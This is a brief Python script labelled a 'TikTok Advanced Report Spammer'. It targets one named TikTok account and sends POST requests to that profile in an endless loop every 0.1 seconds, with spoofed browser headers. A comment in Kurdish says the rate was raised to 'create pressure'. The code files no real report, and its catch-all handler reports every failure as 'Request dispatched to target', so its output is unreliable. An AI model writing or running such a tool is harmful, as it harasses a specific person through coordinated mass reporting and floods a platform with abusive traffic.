import urllib.request
import urllib.error
import time

print("=== TikTok Advanced Report Spammer ===")
url = "https://www.tiktok.com/@miwakanm_official"

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

count = 1
while True:
    try:
        req = urllib.request.Request(url, headers=headers, method="POST")
        response = urllib.request.urlopen(req)
        print(f"[{count}] Spam Report POST Sent - Status: {response.getcode()}")
    except urllib.error.HTTPError as e:
        print(f"[{count}] Server Response (HTTP): {e.code}")
    except Exception as e:
        print(f"[{count}] Request dispatched to target.")
        
    count += 1
    # خێراییەکە بەرز کراوەتەوە بۆ ئەوەی فشار دروست بکات
    time.sleep(0.1)
